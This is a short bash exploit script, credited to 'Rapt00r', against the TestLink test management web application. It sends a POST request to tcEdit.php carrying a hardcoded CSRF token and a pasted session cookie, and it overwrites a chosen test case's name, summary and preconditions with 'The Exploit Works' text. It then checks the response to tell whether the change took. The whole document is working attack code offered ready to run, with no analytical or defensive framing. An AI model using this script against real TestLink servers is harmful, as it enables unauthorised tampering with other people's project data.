#!/bin/bash
# PS: Change the Cookie Value before of launch the exploit 

HOST=$1
TESTCASEID=$2
TCVERSIONID=$(($TESTCASEID+1))

if [ -z $HOST ] || [ -z $TESTCASEID ] 
then
    echo 'Usage: ./modifyTestCase.sh HOST TEST_CASE_ID';
else
    RESPONSE=$(curl -s -X POST "http://"$HOST"/lib/testcases/tcEdit.php" --data "CSRFName=rapt00rCSRFGuard_1672619056&CSRFToken=rapt00r&testsuite_id=&testcase_id="$TESTCASEID"&tcversion_id="$TCVERSIONID"&version=1&doAction=doUpdate&show_mode=show&testcase_name=The+Exploit+Works&summary=The+Exploit+Has+Been+Coded+By+Rapt00r&preconditions=The+Exploit+Works+:)&tc_status=1&importance=2&exec_type=1&estimated_execution_duration=&ot_removedLeft=&ot_removedRight=&ot_addedLeft=&ot_addedRight=&ot_newLeft=1%2C2%2C3&ot_newRight=" -H "Cookie: PHPSESSID=sck6kpl7bm8q92tdk9ttkn2u50; TESTLINK_USER_AUTH_COOKIE=854053dbbf6482b1f59208fcac7eb14ef05dd6855dc5ced499792f0009b5a640; TESTLINK197TL_lastTestPlanForUserID_1=11; TL_lastTestProjectForUserID_4=5; TESTLINK197ys-tproject_5_ext-comp-1001=a%3As%253A%2F5%2F22; TCEditPopupWidth=1073; TCEditPopupHeight=705; ys-edit_tc_tproject_id_5_ext-comp-1001=a%3As%253A/5/22")
    if (echo $RESPONSE | grep "login.php?note=expired&destination=" > /dev/null)
    then
        echo "The Test Case don't has modified";
    else
        echo "The Test Case has been modified";
    fi
fi